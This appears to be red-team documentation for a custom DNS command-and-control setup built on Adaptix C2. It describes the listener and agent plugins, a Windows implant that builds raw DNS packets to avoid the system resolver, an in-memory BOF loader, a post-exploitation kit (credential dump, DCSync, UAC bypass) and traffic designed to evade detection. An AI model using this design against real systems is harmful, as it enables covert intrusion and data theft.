# DNS C2 Infrastructure

## Overview

The DNS C2 stack consists of three components built from scratch on top of Adaptix C2 v1.2.0. The design goal was a transport that generates network traffic indistinguishable from legitimate DNS lookups, with no reliance on the Windows DNS resolver or any Windows DNS API.

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│  Kali Linux — Adaptix C2 Server                                 │
│                                                                 │
│  ┌─────────────────┐      ┌─────────────────┐                  │
│  │  BeaconDNS.so   │      │  dns_agent.so   │                  │
│  │  (PluginListener│      │  (PluginAgent)  │                  │
│  │   miekg/dns UDP)│      │  watermark:     │                  │
│  │   port 53       │◄────►│  d0c00001       │                  │
│  └────────┬────────┘      └─────────────────┘                  │
│           │ TsAgentCreate / TsAgentProcessData                  │
│           │ (Adaptix teamserver API)                            │
└───────────┼─────────────────────────────────────────────────────┘
            │ raw UDP DNS queries / TXT record responses
┌───────────▼─────────────────────────────────────────────────────┐
│  Windows 10 — dns_agent_53.exe (inside loader_evade.exe)        │
│                                                                 │
│  sendto(C2_HOST:53, raw_dns_packet, ...)                        │
│  recvfrom(sock, resp_buf, 65536, ...)                           │
│                                                                 │
│  No DnsQuery API, no Windows resolver, no getaddrinfo          │
└─────────────────────────────────────────────────────────────────┘
```

---

## Component 1: BeaconDNS — The Listener Plugin

`BeaconDNS` is a Go shared-object implementing `adaptix.PluginListener`. It runs a `miekg/dns` UDP+TCP DNS server on the configured port.

### Wire Protocol

Every DNS query name follows the pattern:

```
<base32_data_labels>.<agent_id>.c2.lab
```

- `agent_id` is an 8-character lowercase hex string hardcoded in the implant at compile time
- The XOR encryption key is derived from the agent ID: parse the 8-char hex as 4 bytes
- Data flowing **up** (agent → server): XOR-encrypted, base32-encoded into DNS labels
- Data flowing **down** (server → agent): XOR-encrypted, returned in TXT record values

### Critical Engineering Problem: DNS TXT 255-Byte Limit

BOF tasks are large — a 6.5 KB BOF binary becomes ~10,767 characters after XOR + base32 encoding. The `miekg/dns` library enforces the RFC 1035 limit that each TXT RDATA character-string is at most 255 bytes. Putting 10,767 characters into a single `Txt: []string{txtData}` caused `m.Pack()` to silently return an error and write nothing.

Shell commands (typically <36 chars encoded) always worked. BOFs silently failed — the agent received nothing, treated it as "no tasks," and continued heartbeating. No error was logged on either side.

**Fix:** chunk the base32 response into 255-character segments on the server before building the TXT record. The implant's `dns.c` already concatenated multi-element TXT records per RFC 1035.

```go
var txtChunks []string
for len(txtData) > 0 {
    n := 255
    if n > len(txtData) { n = len(txtData) }
    txtChunks = append(txtChunks, txtData[:n])
    txtData = txtData[n:]
}
```

See [bof-output-fix.md](bof-output-fix.md) for full root cause analysis.

---

## Component 2: dns_agent — The Agent Handler Plugin

`dns_agent` implements `adaptix.PluginAgent` with watermark `d0c00001`. It handles:

- **Registration** — parses the implant's registration payload into an `adaptix.AgentData` struct; the watermark must match exactly what `BeaconDNS` passes to `TsAgentCreate` or the agent never appears in the GUI
- **Task serialization** — converts operator commands into wire format: `[1-byte type][4-byte len][data]`
- **Output deserialization** — unpacks command output back into the teamserver for display

### Go Build ID Compatibility

The Adaptix server ships as a pre-compiled binary built inside Docker. Plugins built with any local Go toolchain will fail to load with "plugin was built with a different version of package" because Go's plugin system requires identical build IDs for every shared package.

**Fix:** always build the server and all plugins together from source in a single `make server-ext` invocation. Use the same Go toolchain for everything. Add `GOEXPERIMENT=jsonv2,greenteagc` to every build — the server uses experimental features and mismatching this produces another build ID divergence.

---

## Component 3: dns_agent_53.exe — The Windows Implant

A Windows x64 C binary compiled with MinGW. Zero Windows DNS API usage — all DNS packets constructed by hand in userspace.

### DNS Packet Construction

```c
// 12-byte DNS header
// Query name: encoded data labels + agent_id + c2.lab
// QTYPE = 16 (TXT)
// QCLASS = 1 (IN)
sendto(sock, packet, len, 0, (SOCKADDR*)&srv, sizeof(srv));
recvfrom(sock, resp_buf, 65536, 0, NULL, NULL);
```

The implant parses just enough of the wire response to extract TXT RDATA, concatenating multi-element character-strings per RFC 1035.

### Startup and Registration

On start, `WSAStartup` initializes Winsock, then `do_registration` loops until `RESP_REG_ACK`. Registration payload includes: hostname, username, PID, architecture, OS version, sleep/jitter, internal IP, process name, and a `TokenElevation` flag (drives agent icon color in GUI — blue = user, yellow = admin/SYSTEM).

### In-Process BOF Loader

`execute-bof` runs Cobalt Strike-compatible COFF `.o` files entirely in-process without writing to disk:

1. Parse COFF header — find sections and symbol table
2. Allocate executable memory per section (`VirtualAlloc` + `VirtualProtect`)
3. Walk relocation table, patch absolute and PC-relative addresses
4. Resolve external symbols — `KERNEL32$VirtualAlloc` → `kernel32!VirtualAlloc`, `MSVCRT$printf` → ucrtbase
5. Call `go` entry point with packed argument buffer

A `beacon_api.c` shim provides `BeaconPrintf`, `BeaconOutput`, `BeaconDataParse`, `BeaconDataInt`, `BeaconIsAdmin`. Output accumulates in a heap buffer and returns through the DNS chunking mechanism.

---

## BOF Kit

The `dns-bof-kit` is a collection of pre-compiled Cobalt Strike-compatible BOF objects wired to the `dns_agent` agent type via a single AxScript file. Categories:

| Category | BOFs |
|---|---|
| Situation Awareness (Local) | ARP, ipconfig, DNS cache, netstat, UAC status, token privs, autologon, unquoted service paths |
| Situation Awareness (Remote) | Port scan, NetBIOS scan, user sessions, scheduled tasks |
| Process | Enumerate with connections, loaded module search, handle search, freeze/unfreeze |
| Credentials | Token steal, credential dump |
| Elevation | UAC bypass — regshellcmd (registry), sspi (NTLM datagram context) |
| Active Directory | LDAP, DCSync, Kerberos, ADCS, LAPS, SQL, relay detection |

---

## Network Characteristics

From a network sensor perspective, the DNS C2 traffic is:

- Standard UDP DNS packets to port 53
- Query names are random-looking base32 subdomains under a registered C2 domain
- TXT record responses with high-entropy content
- No TCP connections, no HTTP headers, no TLS certificates to fingerprint
- Between beacons, no socket is held open — stateless from a network perspective

This generates low-confidence alerts in environments that only alert on unknown domains, not on DNS query frequency or entropy.
